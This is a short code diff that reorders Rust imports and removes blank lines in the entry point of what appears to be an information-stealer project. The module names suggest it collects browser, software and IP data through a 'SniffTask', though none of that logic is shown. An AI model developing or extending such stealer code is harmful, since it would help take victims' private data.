@@ -25,18 +25,18 @@
  */
 
 use alloc::format;
-use rand_core::RngCore;
-use windows_sys::Win32::System::Threading::Sleep;
 use collector::atomic::AtomicCollector;
-use collector::{Browser, Collector, Software};
 use collector::display::PrimitiveDisplayCollector;
+use collector::{Browser, Collector, Software};
 use filesystem::path::Path;
 use filesystem::storage::StorageFileSystem;
 use filesystem::{FileSystem, FileSystemExt};
 use ipinfo::init_ip_info;
+use rand_core::RngCore;
 use shadowsniff::SniffTask;
 use tasks::Task;
 use utils::log_debug;
+use windows_sys::Win32::System::Threading::Sleep;
 
 #[inline(always)]
 pub fn run() {
@@ -54,8 +54,6 @@ pub fn run() {
     SniffTask::default().run(out, &fs, &collector);
 
     let displayed_collector = format!("{}", PrimitiveDisplayCollector(&collector));
-
-
 
     log_debug!("{displayed_collector}");
 }
